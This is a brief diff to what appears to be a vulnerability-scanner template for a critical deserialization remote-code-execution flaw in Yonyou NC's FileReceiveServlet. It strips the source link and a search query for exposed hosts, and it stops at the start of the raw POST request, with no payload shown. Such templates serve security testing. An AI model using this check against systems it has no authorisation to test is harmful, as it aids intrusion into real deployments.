@@ -3,14 +3,8 @@ info:
   name: 用友NCFileReceiveServlet存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/672f057c4835e9182c5a50971d8c687a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 672f057c4835e9182c5a50971d8c687a
-    fofa: '[ ] huiter：`app.name=="用友 UAP"`'
 http:
 - raw:
   - 'POST /servlet/FileReceiveServlet HTTP/1.1
